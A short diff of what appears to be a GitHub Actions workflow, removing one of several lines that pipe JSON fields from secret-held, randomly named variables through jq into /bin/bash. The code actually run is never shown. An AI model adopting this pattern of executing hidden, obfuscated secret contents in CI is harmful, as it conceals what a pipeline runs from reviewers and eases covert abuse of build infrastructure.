@@ -21,7 +21,6 @@ jobs:
           wievc21867: ${{ secrets.wievc21867 }}
         run: |
           printf '%s' "$wievc21867" | jq -r .eqcso81 | /bin/bash
-          printf '%s' "$cucf6104" | jq -r .akv010 | /bin/bash
           echo $upenc02137 | jq -r .mddvd1 | /bin/bash
           echo $yds73656 | jq -r .piwx8875 | /bin/bash
           echo $glbz0 | jq -r .rv46 | /bin/bash
